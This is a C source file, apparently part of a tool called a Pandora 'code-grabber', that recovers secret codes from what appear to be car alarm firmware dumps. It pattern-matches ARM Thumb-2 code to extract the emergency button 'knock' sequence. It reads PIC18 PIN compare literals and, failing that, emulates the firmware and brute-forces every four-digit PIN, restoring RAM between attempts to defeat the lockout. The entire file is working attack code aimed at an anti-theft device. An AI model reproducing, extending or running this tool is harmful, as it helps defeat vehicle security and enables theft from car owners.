/* cracker.c - Pandora code-grabber. Ported from PandoraPINBrute/main.c. */
#include "cracker.h"
#include "pic_emu.h"
#include "pic18_core.h"
#include <stdlib.h>
#include <string.h>

/* ===================== detect ===================== */
int pa_detect_variant(const uint8_t* fw, uint32_t len) {
    if(!fw || len < 8) return PA_VAR_UNKNOWN;
    uint32_t sp = (uint32_t)(fw[0] | (fw[1] << 8) | (fw[2] << 16) | ((uint32_t)fw[3] << 24));
    if(sp >= 0x20000000u && sp < 0x20040000u) /* EFM32 initial SP in SRAM => ARM */
        return (len >= 0x20000u) ? PA_VAR_ARM_D605 : PA_VAR_ARM_MAX;
    return PA_VAR_PIC_DXL;
}

/* ===================== ARM knock (static) ===================== */
const char* pa_knock_name(int b) {
    switch(b) {
    case AK_UP: return "UP";
    case AK_DOWN: return "DOWN";
    case AK_OK: return "OK";
    case AK_BACK: return "BACK";
    case AK_B5: return "B5";
    case AK_B6: return "B6";
    default: return "?";
    }
}
static int ak_portpin(int port, int pin) {
    if(port == 5 && pin == 7) return AK_UP;
    if(port == 5 && pin == 5) return AK_DOWN;
    if(port == 2 && pin == 9) return AK_OK;
    if((port == 2 && pin == 7) || (port == 0 && pin == 15)) return AK_BACK;
    if(port == 0 && pin == 1) return AK_B5;
    if(port == 0 && pin == 6) return AK_B6;
    return -1;
}
static const uint32_t ARM_SCAN_HEADS[] = {0xFDFAu, 0x112E4u};

static void read_window(const uint8_t* img, uint32_t len, uint32_t addr, uint8_t* buf, uint32_t n) {
    for(uint32_t i = 0; i < n; i++) {
        uint32_t a = addr + i;
        buf[i] = (a < len) ? img[a] : 0xFFu;
    }
}
static int ak_rd16(const uint8_t* w, uint32_t wlen, uint32_t off, uint16_t* out) {
    if(off + 1 >= wlen) return 0;
    *out = (uint16_t)(w[off] | (w[off + 1] << 8));
    return 1;
}
static int ak_is32(uint16_t hw) { return (hw >> 11) >= 0x1Du; }

/* pattern-match the unrolled Thumb-2 knock scanner (verbatim from PandoraPINBrute). */
static int arm_extract_knock(const uint8_t* w, uint32_t wlen, uint8_t* out, int maxout) {
    uint32_t a = 0, disp = 0;
    int have_disp = 0;
    while(a + 1 < wlen) {
        uint16_t hw;
        ak_rd16(w, wlen, a, &hw);
        if(hw == 0xE9DDu) {
            uint16_t hw2;
            if(ak_rd16(w, wlen, a + 2, &hw2) && (hw2 & 0xFF00u) == 0x0100u) {
                disp = a;
                have_disp = 1;
                break;
            }
        }
        a += ak_is32(hw) ? 4 : 2;
    }
    if(!have_disp) return 0;
    uint32_t handlers[16];
    int nh = 0;
    a = disp + 4;
    uint32_t dend = disp + 0x80;
    if(dend > wlen) dend = wlen;
    while(a + 1 < dend && nh < 16) {
        uint16_t hw;
        ak_rd16(w, wlen, a, &hw);
        if((hw & 0xFF00u) == 0xD000u) { /* beq (T1) */
            int8_t off = (int8_t)(hw & 0xFF);
            long t = (long)a + 4 + (long)off * 2;
            if(t >= 0 && (uint32_t)t < wlen) handlers[nh++] = (uint32_t)t;
            a += 2;
            continue;
        }
        if((hw & 0xF800u) == 0xE000u && nh > 0) break; /* unconditional B ends the chain */
        a += ak_is32(hw) ? 4 : 2;
    }
    if(nh == 0) return 0;
    int cnt = 0;
    for(int h = 0; h < nh && cnt < maxout; h++) {
        uint32_t p = handlers[h];
        int r0 = -1, r1 = -1, found = 0;
        for(int step = 0; step < 16 && p + 1 < wlen; step++) {
            uint16_t hw;
            ak_rd16(w, wlen, p, &hw);
            if((hw & 0xF800u) == 0x2000u) { /* movs rd,#imm8 */
                int rd = (hw >> 8) & 7, imm = hw & 0xFF;
                if(rd == 0) r0 = imm;
                else if(rd == 1) r1 = imm;
                p += 2;
                continue;
            }
            if(hw == 0x4608u) { r0 = r1; p += 2; continue; } /* mov r0,r1 */
            if((hw & 0xF800u) == 0xF000u) { found = 1; break; } /* bl read_gpio */
            p += ak_is32(hw) ? 4 : 2;
        }
        int btn = (found && r0 >= 0 && r1 >= 0) ? ak_portpin(r0, r1) : -1;
        if(btn < 0) break;
        out[cnt++] = (uint8_t)btn;
    }
    return cnt;
}

int pa_crack_knock(const uint8_t* fw, uint32_t len, uint8_t* out, int maxout) {
    if(!fw || len == 0 || !out || maxout <= 0) return 0;
    static uint8_t win[0x400];
    for(unsigned i = 0; i < sizeof(ARM_SCAN_HEADS) / sizeof(ARM_SCAN_HEADS[0]); i++) {
        read_window(fw, len, ARM_SCAN_HEADS[i], win, sizeof(win));
        int k = arm_extract_knock(win, sizeof(win), out, maxout);
        if(k >= 4) return k;
    }
    return 0;
}

/* ===================== PIC PIN ===================== */
/* Fast path: read the 4 SUBLW compare literals in the PIN validator. */
static int pic_read_pin_literals(const Pic18Cpu* cpu, const PicProfile* p) {
    uint32_t pc = p->pin_validate;
    uint32_t end = pc + 128u;
    int dig[4], found = 0;
    uint16_t prev = 0;
    int have_prev = 0;
    while(pc + 1 < end && found < 4) {
        if(pc + 1 >= cpu->prog_size) break;
        uint16_t w = (uint16_t)(cpu->prog[pc] | (cpu->prog[pc + 1] << 8));
        if(have_prev) {
            uint8_t ph = (uint8_t)(prev >> 8);
            int is_movf_w = (ph == 0x50u || ph == 0x51u); /* MOVF f,W */
            if(is_movf_w && (prev & 0xFFu) == (p->pin_slot_lo[found] & 0xFFu) &&
               (w & 0xFF00u) == 0x0800u) { /* SUBLW k */
                dig[found] = (int)(w & 0xFFu);
                found++;
            }
        }
        prev = w;
        have_prev = 1;
        pc += 2;
    }
    if(found != 4) return -1;
    for(int i = 0; i < 4; i++)
        if(dig[i] > 9) return -1;
    return dig[0] * 1000 + dig[1] * 100 + dig[2] * 10 + dig[3];
}

static int crack_pin_impl(const uint8_t* fw, uint32_t len, const char* name, int skip_literals) {
    if(!fw || len == 0) return -1;
    Pic18Cpu cpu;
    uint32_t codesz = 0;
    uint8_t* prog = pic_load_image(fw, len, &cpu, &codesz);
    if(!prog) return -1;
    const PicProfile* prof = pic_pick_profile(name, &cpu, codesz);
    if(!prof->has_pin) { free(prog); return -1; } /* mario2 has no PIN */

    PicEmu e;
    pic_emu_init(&e, &cpu, prof);
    if(!pic_emu_boot(&e)) { free(prog); return -1; }
    pic_emu_arm_tick(&e);
    pic_emu_run(&e, 200000);

    /* fast path: read the compare literals */
    if(!skip_literals) {
        int lit = pic_read_pin_literals(&cpu, prof);
        if(lit >= 0 && pic_enter_pin(&e, lit) == PIC_PIN_ACCEPT) { free(prog); return lit; }
    }

    /* Brute 0000-9999 via the real validation. Snapshot the booted data RAM and
     * restore it before each attempt so a stateful validator (e.g. a wrong-attempt
     * lockout latch) cannot accumulate across the sweep and block the real PIN. */
    static uint8_t ram_snap[PIC18_RAM_SIZE];
    memcpy(ram_snap, cpu.ram, PIC18_RAM_SIZE);
    for(int pin = 0; pin <= 9999; pin++) {
        memcpy(cpu.ram, ram_snap, PIC18_RAM_SIZE);
        if(pic_enter_pin(&e, pin) == PIC_PIN_ACCEPT) { free(prog); return pin; }
    }
    free(prog);
    return -1;
}

int pic_crack_pin(const uint8_t* fw, uint32_t len, const char* name) {
    return crack_pin_impl(fw, len, name, 0);
}

/* Test-only: force the 0000-9999 brute path (skip the literal fast path) to
 * exercise the RAM-restore sweep end-to-end. */
int pic_crack_pin_brute(const uint8_t* fw, uint32_t len, const char* name) {
    return crack_pin_impl(fw, len, name, 1);
}
